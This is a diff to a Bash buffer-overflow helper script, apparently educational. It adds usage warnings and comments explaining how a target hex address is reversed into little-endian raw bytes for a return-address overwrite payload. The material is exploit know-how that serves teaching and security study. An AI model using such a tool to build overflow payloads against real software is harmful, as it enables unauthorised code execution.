@@ -28,8 +28,10 @@ print_usage() {
 
     echo "[ABOUT ${glbScriptName}]"
     echo "    Use this script to overflow buffers and run unintended code."
-    echo "    WARNING. This script was designed for educational purposes only!"
-    echo "    Using this for any malicious purposes is bad and probably illegal."
+    echo "    Note: This script only supports little-endian systems."
+    echo "    WARNING. This script is for educational purposes only!"
+    echo "    Using this script for any malicious purposes is bad and illegal."
+    echo "    The author(s) of this script are not responsible for its users' actions."
 
     echo ""
 
@@ -88,12 +90,15 @@ get_raw_address() {
     local assembledBytes=""
 
     # Reverse the hex address for little-endian systems.
+    # I.e., '0x40262c' becomes '2c2640'.
     for i in $(seq 1 ${#hexAddress}); do
 
         byte="${byte}${hexAddress:i-1:1}"
 
-        if [ $(( ${i} % 2 )) -eq 0 2> /dev/null ]
+        if [ $(( ${i} % 2 )) -eq 0 ] 2> /dev/null
         then
+            # When rebuilding the address, we need to add '\x' to indicate we
+            # want the ASCII representation of the hex address.
             byte="\x${byte}"
             bytes[${bytesIndex}]="${byte}"
             byte=""
@@ -108,6 +113,8 @@ get_raw_address() {
 
     done
 
+    # The '-e' argument allows 'echo' to print an ASCII representation of
+    # each byte.
     echo -e "${assembledBytes}"
 
 }
@@ -153,6 +160,7 @@ while getopts :a:hs:t: opt; do
         'a' )
             if [[ "${OPTARG}" == "0x"* ]]
             then
+                # If the user specified an optional '0x' prefix, then remove it.
                 targetHexAddress="${OPTARG##*'0x'}"
             else
                 targetHexAddress="${OPTARG}"
